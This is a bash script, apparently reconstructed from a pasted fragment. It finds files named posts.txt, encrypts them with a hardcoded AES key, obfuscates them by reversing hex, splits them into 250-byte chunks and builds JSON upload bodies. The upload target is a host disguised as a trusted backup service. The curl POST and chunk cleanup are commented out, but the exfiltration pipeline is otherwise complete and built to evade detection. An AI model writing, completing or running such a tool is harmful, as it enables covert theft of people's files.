#!/usr/bin/env bash
set -euo pipefail

IP="192.168.1.58"
HOST="trusted.backup.co.id"
SRC="$PWD"
# Likely full URL (name looked obfuscated/split in your paste)
URL="http://trusted.backup.co.id/httpd20946405a2.pem"

# Drive key/iv from a local seed file
KEY_HEX="2d2d2d2d2d424547494e2050524956415445204b45592d2d2d2d2d0a4d494945"   # 64 hex chars (256-bit key)
IV_HEX="524956415445204b45592d2d2d2d2d0a"    # 32 hex chars (128-bit IV)

# Iterate files (your fragment hinted at a loop over $SRC -> $F and a $REL path)
find "$SRC" -type f -name "posts.txt" | while IFS= read -r F; do
  REL="${F#$SRC/}"                      # relative path
  ENC="$(mktemp "/tmp/${REL//\//__}.XXXXXX")"

  # Encrypt + obfuscate into $ENC
  # (their paste shows: openssl enc -aes-256-cfb -K "$KEY_HEX" -iv "$IV_HEX" -in "$F" |
  #   xxd -p | rev | xxd -r -p | tee "$ENC" > /dev/null)
  openssl enc -aes-256-cfb -K "$KEY_HEX" -iv "$IV_HEX" -in "$F" \
  | xxd -p | rev | xxd -r -p \
  | tee "$ENC" > /dev/null

  # Split into 250-byte pieces with 6-digit numeric suffixes
  split -b 250 -d -a 6 "$ENC" "/tmp/${REL//\//__}.enc."

  # Ship each chunk
  for C in /tmp/${REL//\//__}.enc.*; do
    echo "[*] Uploading $REL -> $(basename "$C")"

    # Hex-encode chunk, strip newlines, reverse hex text, POST as JSON
    CHUNK_DATA="$(xxd -p "$C" | tr -d '\n' | rev)"
    # curl -sS -X POST "$URL" \
    #   -H 'Content-Type: application/json' \
    #   -d "{\"data\":\"$CHUNK_DATA\",\"chunk\":\"$(basename "$C")\"}"
    echo "{\"data\":\"$CHUNK_DATA\",\"chunk\":\"$(basename "$C")\"}"

    # rm -f "$C"
  done

  rm -f "$ENC"
done
